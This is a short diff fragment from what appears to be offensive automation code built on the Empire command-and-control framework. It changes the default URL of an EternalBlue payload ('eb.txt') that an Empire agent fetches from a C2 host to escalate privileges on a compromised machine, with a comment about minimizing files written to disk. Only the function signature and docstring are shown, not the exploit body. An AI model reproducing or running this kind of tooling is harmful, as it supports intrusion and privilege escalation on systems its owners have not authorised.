@@ -11,7 +11,7 @@ against the IP. We want to minimize files onto disk.
 from EmpireAPIWrapper import empireAPI
 from c2_settings import EMPIRE_SERVER, EMPIRE_PWD, EMPIRE_USER
 
-def run(API, agent_name, eternalblue_url='http://172.30.1.215:8000/eb.txt'):
+def run(API, agent_name, eternalblue_url='http://empirec2:8000/eb.txt'):
     """
     Uses EternalBlue to EoP locally 
     \n:param API: EmpireAPIWrapper object
